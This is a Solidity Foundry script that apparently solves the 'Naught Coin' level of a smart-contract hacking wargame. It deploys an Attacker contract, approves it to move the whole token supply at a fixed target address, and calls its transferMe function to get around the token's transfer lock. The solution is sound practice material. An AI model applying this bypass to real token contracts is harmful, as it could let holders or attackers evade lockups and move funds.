// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Script} from "forge-std/Script.sol";
import {Attacker} from "./../src/15-Naught Coin/Attacker.sol";

interface INaughtCoin {
    function approve(address spender, uint256 amount) external returns (bool);
    function decimals() external view returns (uint8);
}

contract DeployAttacker is Script{
    address constant public TARGET_ADDRESS = 0x252348C239c3435DFab1365C20DDF989dd8A8431;
    uint256 public INITIAL_SUPPLY;

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Attacker attacker = new Attacker();

        INITIAL_SUPPLY = 1000000 * (10 ** uint256(INaughtCoin(TARGET_ADDRESS).decimals()));
        INaughtCoin(TARGET_ADDRESS).approve(address(attacker), INITIAL_SUPPLY);

        attacker.transferMe();

        vm.stopBroadcast();
    }

}